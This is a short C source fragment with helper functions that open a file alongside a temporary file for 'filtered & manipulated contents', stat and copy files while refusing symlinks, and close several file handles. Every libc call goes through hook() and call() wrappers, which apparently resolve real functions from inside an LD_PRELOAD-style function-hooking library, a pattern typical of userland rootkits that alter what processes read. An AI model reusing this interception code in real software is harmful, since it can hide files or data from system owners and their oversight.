/* opens pathname for reading. the pointer tmp is a tmpfile() meant for filtered & manipulated contents of pathname.
 * if either fopen call fails NULL is returned & the calling function decides what to do. */
FILE *redirstream(const char *pathname, FILE **tmp){
    hook(CFOPEN);
    FILE *fp = call(CFOPEN, pathname, "r");
    if(fp == NULL)
        return NULL;

    *tmp = tmpfile();
    if(*tmp == NULL){
        fclose(fp);
        return NULL;
    }

    return fp;
}

FILE *bindup(const char *path, char *newpath, FILE **nfp, u_long *fsize, mode_t *mode){
    FILE *ret;
    struct stat bstat;
    int statr;

    hook(C__LXSTAT, CFOPEN);
    
    memset(&bstat, 0, sizeof(struct stat));
    statr = (long)call(C__LXSTAT, _STAT_VER, path, &bstat);
    if(statr < 0) return NULL;

    *mode = bstat.st_mode;
    if(S_ISLNK(*mode)) // never ever
        return NULL;
    *fsize = (u_long)bstat.st_size;

    ret = call(CFOPEN, path, "rb");
    if(ret == NULL) return NULL;

    if(nfp != NULL){
        *nfp = call(CFOPEN, newpath, "wb+");
        if(*nfp == NULL){
            fclose(ret);
            return NULL;
        }
    }

    return ret;
}

/* closes all c FILE pointers passed as args. */
void fcloser(const u_int c, ...){
    u_int i = 0;
    FILE *fp;
    va_list va;
    va_start(va, c);
    while((fp = va_arg(va, FILE*)) != NULL && i++ < c)
        fclose(fp);
    va_end(va);
}